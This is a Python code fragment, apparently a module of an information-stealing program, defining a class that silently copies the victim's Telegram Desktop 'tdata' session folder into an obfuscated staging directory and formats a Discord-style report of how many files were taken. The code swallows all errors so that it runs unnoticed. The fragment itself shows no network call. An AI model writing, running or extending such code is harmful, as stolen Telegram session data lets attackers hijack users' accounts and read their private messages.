class Telegram:

    def __init__(self):
        self.files = 0
        try:
            os.mkdir(os.path.join(P4THF0LDR, "Telegram"))
            self.telegramfolder = os.path.join(P4THF0LDR, "Telegram")
            self.path = os.path.join(os.environ["USERPROFILE"], "AppData","Roaming","Telegram Desktop","tdata")
            self.getTele(self.path)
        except:
            pass
    
    def getTele(self,path):
        files = os.listdir(path)
        for i in files:
            self.files +=1
            shutil.copy(path+"\\"+i,self.telegramfolder+"\\"+i)
    
    def __repr__(self):
        if self.files > 0:
            return f"""
``|_`` :open_file_folder: ``Telegram``
``|   |_``:page_facing_up: ``({self.files}) Telegram Files``"""
        else:
            return f"""
``|_`` :open_file_folder: ``Telegram``
``|   |_``:x: ``Telegram Not Found``"""